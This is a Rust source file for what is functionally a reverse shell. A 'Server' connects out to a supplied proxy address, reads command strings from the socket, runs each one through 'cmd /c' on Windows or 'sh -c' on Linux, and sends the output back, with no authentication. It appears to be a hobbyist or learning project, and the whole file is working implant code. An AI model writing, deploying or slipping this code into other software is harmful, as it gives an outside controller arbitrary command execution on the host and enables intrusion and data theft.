use std::fmt::Display;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::process::{Command, Stdio};

pub struct ServerArgs<'a, A>
where
    A: ToSocketAddrs + Display,
{
    proxy_addr: &'a A,
}

impl<'a, A> ServerArgs<'a, A>
where
    A: ToSocketAddrs + Display,
{
    pub fn from_args(cli_args: &'a Vec<A>) -> Self {
        let mut arg_iter = cli_args.into_iter();

        let proxy_addr = arg_iter.next().expect("expected proxy address <addr:port>");

        if let Some(a) = arg_iter.next() {
            panic!("unexpected arg: {}", a)
        }

        Self { proxy_addr }
    }
}
pub struct Server {
    pub proxy_stream: TcpStream,
}

impl Server {
    pub fn new<A>(args: ServerArgs<A>) -> Self
    where
        A: ToSocketAddrs + Display,
    {
        println!("binding server to proxy");

        //Should add retry logic with exponential falloff
        let proxy_stream =
            TcpStream::connect(args.proxy_addr).expect("server failed to connect to proxy");

        println!("server bound to proxy");
        Self { proxy_stream }
    }

    pub fn run(&mut self) {
        let mut buf = [0_u8; 1024];

        loop {
            if let Err(_) = self.proxy_stream.read(&mut buf) {
                panic!("error occured when reading stream");
            }

            let cmd = String::from_utf8(buf.to_vec()).unwrap();

            println!("got command: {}", cmd);

            let output = self.execute_command(&cmd);

            self.proxy_stream.write(output.as_bytes()).unwrap();
            self.proxy_stream.flush().unwrap();
        }
    }

    fn execute_command(&mut self, command: &str) -> String {
        let cleaned_command = command.replace('\0', "");

        // currently creates new shell session on every run, not what i want

        #[cfg(target_os = "windows")]
        let output = Command::new("cmd")
            .arg("/c")
            .arg(cleaned_command)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap()
            .wait_with_output()
            .unwrap();

        #[cfg(target_os = "linux")]
        let output = Command::new("sh")
            .arg("-c")
            .arg(cleaned_command)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap()
            .wait_with_output()
            .unwrap();

        let mut data = String::from_utf8(output.stdout).unwrap();
        if data == "" {
            data = format!("{}", output.status)
        }
        println!("command output: {}", data);

        return data;
    }
}
